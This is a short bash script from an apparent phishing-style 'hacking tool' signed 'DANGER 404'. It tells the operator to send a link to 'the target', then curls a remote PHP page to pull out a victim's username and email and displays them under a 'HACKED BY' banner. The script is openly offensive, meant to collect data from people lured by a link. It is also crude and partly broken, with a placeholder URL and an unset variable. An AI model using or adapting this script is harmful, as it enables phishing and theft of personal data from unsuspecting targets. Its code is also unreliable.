#!/bin/bash
clear
source .incl.sh
clear
sleep 1.5
echo -e "     ${green}SEND THIS LINK TO THE TARGET"
echo -e "       ${red}https://post.bytee.net/${re}"
echo ""
read -p "   PRESS ENTER "
clear
# Make a GET request to the PHP file and retrieve the printed data
response=$(curl -s "https://example.com/data.php")

# Extract the username and email using grep or awk
username=$(echo "$response" | grep -oP 'Username: \K\S+')
email=$(echo "$response" | grep -oP 'Email: \K\S+')

# Display the extracted data
echo ""
echo -e "    [+] ${red}HACKED ${yellow}BY ${green}DANGER 404${re} [+]"
echo ""
echo -e "${yellow}USERNAME:${red} $username"
echo -e "${yellow}EMAIL:${red} $email"
sleep 1.5
echo -e "${green}___________________"
echo ""
if [ "$email" == "" ];
then echo -e "${red}[×] CONN FAILED ... !"
echo
echo -e "           ${re}[ ${yellow}TOOL COOLING ! ${re}]"
sleep 20
echo
read -p "     PRESS ENTER TO REFRESH"
else echo ""
echo -e "${green}   FOUND ON OUR DATABASE $ip"
echo
fi
